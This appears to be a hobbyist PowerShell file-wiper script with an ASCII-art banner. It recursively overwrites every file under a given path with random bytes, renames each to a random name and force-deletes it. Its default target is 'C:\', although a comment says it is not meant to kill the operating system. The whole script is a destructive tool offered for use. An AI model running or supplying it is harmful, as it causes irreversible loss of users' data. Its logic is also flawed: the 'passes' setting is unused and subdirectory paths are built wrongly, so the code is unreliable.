#Coded By MachineGun 
#Date 14-07-2024 | Sunday 
#This Script is Not Designed To  Kill The Operating System .
<#
                  _________-----_____
       _____------           __      ----_
___----             ___------              \
   ----________        ----                 \
               -----__    |             _____)
                    __-                /     \
        _______-----    ___--          \    /)\
  ------_______      ---____            \__/  /
               -----__    \ --    _          /\
                      --__--__     \_____/   \_/\
                              ----|   /          |
                                  |  |___________|
                                  |  | ((_(_)| )_)
                                  |  \_((_(_)|/(_)
                                  \             (
                                   \_____________)
#>
#########################
param (
    [string]$path = "C:\", #Default Values You Can Change Them Or pass the Valuse #>  -path "Path TO FILE " -passes 5; 
    [int]$passes = 3
)

function OverwriteFile { #Function To Replace The File Data With Junk Data
    param (
        [string]$file,
        [int]$size
    )

    $randomData = New-Object byte[] $size
    (New-Object Random).NextBytes($randomData)
    [System.IO.File]::WriteAllBytes($file, $randomData)

}


if ((Test-Path -Path $path) -eq $false) { #Check The Availibity Of the Path
    echo "File does not exist: $path"
    exit
}

$query =  Get-ChildItem $path -r | Select-Object -Property Name, Length #Get File Names and Length IN All Directories And SubDirectories



foreach ($name in $query) { #Replace Data - Rename File - Delete File
    $full_path = $path+"\"+$name.Name
    OverwriteFile -file $full_path -size $name.Length
    $randomName = [System.IO.Path]::GetRandomFileName()
    Rename-Item -Path $full_path -NewName $randomName
    $full_random_path = $path+"\"+$randomName
    Remove-Item -Path $full_random_path -Force
    Write-Host "File Deleted #_#--> $full_path"
}

###################################################
#We Will Have Update On This ....
###################################################
